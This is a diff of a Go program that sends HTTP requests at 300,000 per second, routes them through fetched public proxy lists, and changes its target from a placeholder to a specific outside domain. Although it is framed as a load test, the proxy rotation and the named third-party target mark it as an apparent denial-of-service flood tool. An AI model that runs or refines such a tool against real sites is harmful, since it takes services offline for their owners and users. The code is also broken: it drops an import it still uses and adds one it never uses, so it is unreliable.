@@ -1,8 +1,7 @@
 package main
-// ver2
+
 import (
     "fmt"
-    "io"
     "net"
     "runtime"
     "strings"
@@ -11,13 +10,15 @@ import (
     "time"
 
     "github.com/valyala/fasthttp"
+    "golang.org/x/net/http2"
+    "net/http" // Added for proxy fetching and local server
 )
 
 func main() {
     // Configuration
     const targetRPS = 300000
     const testDuration = 230 * time.Second
-    url := "http://your-api-endpoint.com" // Replace with your API URL (HTTP/2 preferred)
+    url := "https://subxin.com" // Replace with your API URL (HTTP/2 preferred)
 
     // Optimize runtime
     runtime.GOMAXPROCS(runtime.NumCPU())
@@ -85,7 +86,6 @@ func main() {
                     err := client.Do(req, resp)
                     if err != nil {
                         atomic.AddInt64(&failedRequests, 1)
-
                         continue
                     }
                     if resp.StatusCode() >= 200 && resp.StatusCode() < 300 {
@@ -157,18 +157,14 @@ func fetchProxies() []string {
     }
     var proxies []string
 
-    client := &fasthttp.Client{ReadTimeout: 5 * time.Second}
-    req := fasthttp.AcquireRequest()
-    resp := fasthttp.AcquireResponse()
-    defer fasthttp.ReleaseRequest(req)
-    defer fasthttp.ReleaseResponse(resp)
-
+    client := &http.Client{Timeout: 5 * time.Second} // Use net/http for proxy fetching
     for _, source := range proxySources {
-        req.SetRequestURI(source)
-        if err := client.Do(req, resp); err != nil {
+        resp, err := client.Get(source)
+        if err != nil {
             continue
         }
-        body := resp.Body()
+        defer resp.Body.Close()
+        body, _ := io.ReadAll(resp.Body)
         lines := strings.Split(string(body), "\n")
         for _, line := range lines {
             line = strings.TrimSpace(line)
